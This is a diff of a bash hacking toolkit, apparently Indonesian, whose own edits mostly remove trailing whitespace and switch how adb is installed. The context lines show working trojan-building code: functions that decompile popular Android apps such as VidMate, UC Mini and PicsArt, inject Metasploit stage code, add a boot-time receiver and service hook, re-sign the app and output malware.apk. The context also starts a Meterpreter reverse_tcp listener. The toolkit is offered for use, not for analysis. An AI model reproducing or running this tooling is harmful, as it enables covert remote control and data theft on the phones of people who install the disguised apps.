@@ -113,7 +113,7 @@ if [ -f /usr/bin/msfconsole ]; then
     printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing metasploit!\n"
     apt-get install metasploit -y
     fi
-    sleep 0.025                        
+    sleep 0.025
 
 if [ -f /usr/bin/aapt ]; then
     printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m aapt is already exists!\n"
@@ -138,9 +138,9 @@ if [ -f /usr/local/bin/apktool ]; then
     cd $path && wget https://raw.githubusercontent.com/K1M4K-ID/support/master/apktool > /dev/null 2>&1 && chmod +x apktool && mv apktool /usr/local/bin
     cd $path && wget https://github.com/K1M4K-ID/support/blob/master/apktool.jar?raw=true > /dev/null 2>&1 && mv -f apktool.jar?raw=true apktool.jar && mv apktool.jar /usr/local/bin
 
-    fi          
-    sleep 0.025                                                                
-    
+    fi
+    sleep 0.025
+
 if [ -f /usr/bin/java ]; then
     printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m java is already exists!\n"
     else
@@ -172,9 +172,10 @@ if [ -f /usr/bin/adb ]; then
     printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m adb is already exists!\n"
     else
     printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing adb!\n"
-    cd $path/msfkit && wget https://github.com/K1M4K-ID/adb-1.0.41/blob/main/adb.zip?raw=true > /dev/null 2>&1 && mv adb.zip?raw=true adb.zip && unzip adb.zip > /dev/null
-    fi          
-    sleep 0.025                                      
+		apt-get install adb -y
+		#cd $path && wget https://github.com/K1M4K-ID/adb-1.0.41/blob/main/adb.zip?raw=true > /dev/null 2>&1 && mv adb.zip?raw=true adb.zip && unzip adb.zip > /dev/null
+    fi
+    sleep 0.025
 
 if [ -f /usr/bin/jarsigner ]; then
     printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m jarsigner is already exists!\n"
@@ -275,7 +276,7 @@ function metasploit(){
     baner
     echo
     echo
-	printf "\033[31;1m[\033[32;1m1\033[31;1m]\033[37;1m create payload android\033[31;1m\n"
+				printf "\033[31;1m[\033[32;1m1\033[31;1m]\033[37;1m create payload android\033[31;1m\n"
         sleep 0.025
         printf "\033[31;1m[\033[32;1m2\033[31;1m]\033[37;1m create listerner\033[31;1m\n"
         sleep 0.025
@@ -304,7 +305,7 @@ function serangan_wifi(){
         read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
         sleep 0.025
         printf '\033[31;1m'
-    
+
 }
 
 # user input 4 sniffing & MITM
@@ -318,7 +319,7 @@ function sadap(){
         read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
         sleep 0.025
         printf '\033[31;1m'
-        	
+
 }
 
 # user pilih menu lainya
@@ -355,7 +356,7 @@ function others(){
         printf '\033[31;1m'
         spiner
         echo
-        	
+
 }
 
 janda(){
@@ -386,7 +387,7 @@ printf '\033[31;1m'"""
 # runner numb 1
 # information gathering
 function search(){
-	printf '\033[31;1m' 
+	printf '\033[31;1m'
 	spiner
 	echo
         printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\033[31;1m\n"
@@ -395,11 +396,11 @@ function search(){
         clear
         bash $path/.data/recon/userrecon.sh
         mv *.txt ../data/out
-        printf '\033[31;1m' 
+        printf '\033[31;1m'
         spiner
         echo
         read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] back "'\033[34;1m')" xyz
-        printf '\033[31;1m' 
+        printf '\033[31;1m'
         spiner
         echo
         sleep 0.025
@@ -408,7 +409,7 @@ function search(){
 
 # information gathering
 function osint(){
-	printf '\033[31;1m' 
+	printf '\033[31;1m'
 	spiner
 	echo
         printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\033[31;1m\n"
@@ -416,11 +417,11 @@ function osint(){
         spiner
         clear
         python3 $path/.data/osint/osints.py
-        printf '\033[31;1m' 
+        printf '\033[31;1m'
         spiner
         echo
         read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] back "'\033[34;1m')" xyz
-        printf '\033[31;1m' 
+        printf '\033[31;1m'
         spiner
         echo
         sleep 0.025
@@ -468,7 +469,7 @@ function osintinstagram(){
                 printf '\033[31;1m'
                 spiner
                 echo
-                        
+
                 fi
 
         cd $path/.data/Osint && make setup && cd $path/.data/Osint && pip3 install -r requirements.txt
@@ -480,7 +481,7 @@ function osintinstagram(){
         printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m example >> contoh_\n"
         printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m\n"
         read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m target : "'\033[34;1m')" target
-        cd $path/.data/Osint && python3 main.py $target 
+        cd $path/.data/Osint && python3 main.py $target
         sleep 3
         osintinstagram
 
@@ -521,9 +522,9 @@ function nmproot(){
                 if [ $scan = "y"  ];
                 then
                 nmproot
-            
+
                 else [ $scan != "y" ]
-                
+
                 fi
         done
 }
@@ -606,7 +607,7 @@ function whs(){
     spiner
     printf '\033[37;1m'
     echo
-    whois $target 
+    whois $target
     sleep 0.025
     printf '\033[31;1m'
     spiner
@@ -681,7 +682,7 @@ function run_information(){
 function sets(){
         clear
         baner
-        printf '\033[31;1m' 
+        printf '\033[31;1m'
         echo
         spiner
         echo
@@ -722,7 +723,7 @@ function sets(){
 function sets_original(){
         clear
         baner
-        printf '\033[31;1m' 
+        printf '\033[31;1m'
         echo
         spiner
         echo
@@ -885,7 +886,7 @@ if [ ! -f .android/key.keystore ]; then
         if [ ! -d ".android"  ]; then
         mkdir .android > /dev/null 2>&1
         fi
-        keytool -genkey -v -keystore .android/key.keystore -storepass android -alias key -keypass android -keyalg RSA -keysize 2048 -validity 10000 
+        keytool -genkey -v -keystore .android/key.keystore -storepass android -alias key -keypass android -keyalg RSA -keysize 2048 -validity 10000
 fi
         printf "\033[37;1m[\033[32;1m*\033[37;1m] mencoba menandatangani paket dengan kunci android anda\033[31;1m\n"
         spiner
@@ -931,14 +932,14 @@ function android(){
         	if [ $xyz = "1"  ];
         	then
         	backdoor
-        	
+
         	elif [ $xyz = "2"  ];
         	then
         	backdoor_template
-        	
+
         	elif [ $xyz = "3"  ];
         	then
-        	backdoor_file	
+        	backdoor_file
 
 		elif [ $xyz = "0"  ];
 		then
@@ -947,8 +948,8 @@ function android(){
 		else
 		printf "\033[31;1m[\033[37;1m!\033[31;1m]\033[37;1m masukan input dengan benar . .\n"
 	        sleep 2
-		android	
-		
+		android
+
 		fi
 }
 
@@ -1011,85 +1012,85 @@ clear
 	spyphone
 	sign
 	rename_backdoor
-	
+
 	elif [ $xyz = "2" ] || [ $xyz = "02"  ];
 	then
 	speedtest
 	sign
 	rename_backdoor
-	
+
 	elif [ $xyz = "3" ] || [ $xyz = "03"  ];
 	then
 	vidmate
 	sign
 	rename_backdoor
-	
+
 	elif [ $xyz = "4" ] || [ $xyz = "04"  ];
 	then
 	wifiwps
 	sign
 	rename_backdoor
-	
+
 	elif [ $xyz = "5" ] || [ $xyz = "05"  ];
 	then
 	uc
 	sign
 	rename_backdoor
-	
+
 	elif [ $xyz = "6" ] || [ $xyz = "06"  ];
 	then
 	keyboard
 	sign
 	rename_backdoor
-	
+
 	elif [ $xyz = "7" ] || [ $xyz = "07"  ];
 	then
 	g45
 	sign
 	rename_backdoor
-	
+
 	elif [ $xyz = "8" ] || [ $xyz = "08"  ];
 	then
 	design
 	sign
 	rename_backdoor
-	
+
 	elif [ $xyz = "9" ] || [ $xyz = "09"  ];
 	then
 	droidsql
 	sign
 	rename_backdoor
-	
+
 	elif [ $xyz = "10" ] || [ $xyz = "10"  ];
 	then
 	ave
 	sign
 	rename_backdoor
-	
+
 	elif [ $xyz = "11" ] || [ $xyz = "11"  ];
 	then
 	indoxxi
 	sign
 	rename_backdoor
-	
+
 	elif [ $xyz = "12" ] || [ $xyz = "12"  ];
 	then
 	picsart
 	sign
 	rename_backdoor
-	
+
 	elif [ $xyz = "0" ] || [ $xyz = "00"  ];
 	then
 	android
-	
+
 	else
 	printf "\033[31;1m[\033[37;1m!\033[31;1m]\033[37;1m masukan input dengan benar . .\n"
 	sleep 2
 	printf '\033[31;1m'
 	backdoor_template
-	
+
 	fi
-	
+
 }
 
 # backdoor spyphone
@@ -1232,7 +1233,7 @@ function vidmate(){
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
-        sudo apktool d vidmate.apk 
+        sudo apktool d vidmate.apk
         spiner
         echo
         printf "\033[37;1m[\033[32;1m*\033[37;1m] recompyle vidmate please wait\033[31;1m\n"
@@ -1245,7 +1246,7 @@ function vidmate(){
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
-        sudo apktool b vidmate -o malware.apk 
+        sudo apktool b vidmate -o malware.apk
         rm -fr vidmate.apk vidmate payload payload.apk
         spiner
 }
@@ -1283,7 +1284,7 @@ function wifiwps(){
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
-        sudo apktool d wps.apk 
+        sudo apktool d wps.apk
         spiner
         echo
         printf "\033[37;1m[\033[32;1m*\033[37;1m] recompyle wifi wps please wait\033[31;1m\n"
@@ -1296,7 +1297,7 @@ function wifiwps(){
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
-        sudo apktool b wps -o malware.apk 
+        sudo apktool b wps -o malware.apk
         rm -fr wps.apk wps payload payload.apk
         spiner
 }
@@ -1326,7 +1327,7 @@ function uc(){
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
-        sudo apktool d payload.apk 
+        sudo apktool d payload.apk
         spiner
         echo
         printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle uc mini please wait\033[31;1m\n"
@@ -1334,7 +1335,7 @@ function uc(){
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
-        sudo apktool d uc.apk 
+        sudo apktool d uc.apk
         spiner
         echo
         printf "\033[37;1m[\033[32;1m*\033[37;1m] recompyle uc mini please wait\033[31;1m\n"
@@ -1347,7 +1348,7 @@ function uc(){
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
-        sudo apktool b uc -o malware.apk 
+        sudo apktool b uc -o malware.apk
         rm -fr uc.apk uc payload payload.apk
         spiner
 }
@@ -1377,7 +1378,7 @@ function keyboard(){
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
-        sudo apktool d payload.apk 
+        sudo apktool d payload.apk
         spiner
         echo
         printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle keyboard hacker please wait\033[31;1m\n"
@@ -1385,7 +1386,7 @@ function keyboard(){
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
-        sudo apktool d keyboard.apk 
+        sudo apktool d keyboard.apk
         spiner
         echo
         printf "\033[37;1m[\033[32;1m*\033[37;1m] recompyle keyboard hacker please wait\033[31;1m\n"
@@ -1398,7 +1399,7 @@ function keyboard(){
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
-        sudo apktool b keyboard -o malware.apk 
+        sudo apktool b keyboard -o malware.apk
         rm -fr keyboard.apk keyboard payload payload.apk
         spiner
 }
@@ -1428,7 +1429,7 @@ function g45(){
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
-        sudo apktool d payload.apk 
+        sudo apktool d payload.apk
         spiner
         echo
         printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle g45 please wait\033[31;1m\n"
@@ -1436,7 +1437,7 @@ function g45(){
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
-        sudo apktool d g45.apk 
+        sudo apktool d g45.apk
         spiner
         echo
         printf "\033[37;1m[\033[32;1m*\033[37;1m] recompyle g45 please wait\033[31;1m\n"
@@ -1449,7 +1450,7 @@ function g45(){
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
-        sudo apktool b g45 -o malware.apk 
+        sudo apktool b g45 -o malware.apk
         rm -fr g45.apk g45 payload payload.apk
         spiner
 }
@@ -1487,7 +1488,7 @@ function design(){
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
-        sudo apktool d design.apk 
+        sudo apktool d design.apk
         spiner
         echo
         printf "\033[37;1m[\033[32;1m*\033[37;1m] recompyle design please wait\033[31;1m\n"
@@ -1500,7 +1501,7 @@ function design(){
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
-        sudo apktool b design -o malware.apk 
+        sudo apktool b design -o malware.apk
         rm -fr design.apk design payload payload.apk
         spiner
 }
@@ -1551,7 +1552,7 @@ function droidsql(){
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
-        sudo apktool b droidsqli -o malware.apk 
+        sudo apktool b droidsqli -o malware.apk
         rm -fr droidsqli.apk droidsqli payload payload.apk
         spiner
 }
@@ -1581,7 +1582,7 @@ function ave(){
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
-        sudo apktool d payload.apk 
+        sudo apktool d payload.apk
         spiner
         echo
         printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle ave player please wait\033[31;1m\n"
@@ -1704,7 +1705,7 @@ function picsart(){
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
-        sudo apktool b piscart -o malware.apk 
+        sudo apktool b piscart -o malware.apk
         rm -fr picsart.apk piscart payload payload.apk
         spiner
 }
@@ -1732,7 +1733,7 @@ function clear_data(){
 }
 
 # fix java sudo apktool, and sign
-# 
+#
 #_SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
 # backdoor buat inject
 #
@@ -1743,10 +1744,10 @@ function inject_payload(){
 }
 
 # fungsi get aplikasi web GUI
-# 
+#
 function xyz()
 {
- orig=$(zenity --title " Aplikasi Original " --filename=$path --file-selection --file-filter "*.apk" --text "chose the original (apk)" 2> /dev/null) 
+ orig=$(zenity --title " Aplikasi Original " --filename=$path --file-selection --file-filter "*.apk" --text "chose the original (apk)" 2> /dev/null)
 }
 
 # decompyle payload
@@ -1787,7 +1788,7 @@ function rebuild_original(){
 }
 
 # add permission dan hook
-# 
+#
 function perms()
 {
  printf $ku""
@@ -1810,11 +1811,11 @@ function perms()
   cp -r $path/payload/smali/com/metasploit/stage $path/original/smali/$app_name > /dev/null 2>&1
   amanifest="    </application>"
   boot_cmp='        <receiver android:label="MainBroadcastReceiver" android:name="'$app_dash.stage.MainBroadcastReceiver'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$app_dash.stage.MainService'"/></application>'
-  sed -i "s|$amanifest|$boot_cmp|g" $path/original/AndroidManifest.xml 2>&1    
+  sed -i "s|$amanifest|$boot_cmp|g" $path/original/AndroidManifest.xml 2>&1
  fi
  amanifest="    </application>"
  boot_cmp='        <receiver android:label="MainBroadcastReceiver" android:name="'$package_dash.stage.MainBroadcastReceiver'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$package_dash.stage.MainService'"/></application>'
- sed -i "s|$amanifest|$boot_cmp|g" $path/original/AndroidManifest.xml 2>&1    
+ sed -i "s|$amanifest|$boot_cmp|g" $path/original/AndroidManifest.xml 2>&1
  android_nam=$tmp
 }
 
@@ -1858,7 +1859,7 @@ function hook_smalies()
     printf "\033[32;1m++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
     starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
     sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_targetActivity.smali > /dev/null 2>&1
-  fi 
+  fi
  fi
 }
 
@@ -1897,17 +1898,17 @@ function listerners(){
 	msfconsole -x "use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST $lh;set LPORT $lp;exploit;"
 	clear
 	listerners
-	
+
 	elif [ $xyz = "x"  ];
 	then
 	run_metasploit
-	
+
 	else
         printf "\033[31;1m[\033[37;1m!\033[31;1m]\033[37;1m masukan input dengan benar . .\n"
 	sleep 2
 	clear
 	listerners
-	
+
 	fi
 }
 
@@ -1919,8 +1920,8 @@ function run_metasploit(){
                 if [ $xyz = "1"  ];
                 then
                 android
-                run_metasploit             
-                
+                run_metasploit
+
                 elif [ $xyz = "2"  ];
                 then
                 clear
@@ -1936,8 +1937,8 @@ function run_metasploit(){
                 else
                 printf "\033[31;1m[\033[37;1m!\033[31;1m]\033[37;1m masukan input dengan benar . .\n"
                 sleep 2
-                run_metasploit 
-                
+                run_metasploit
+
                 fi
 }
 
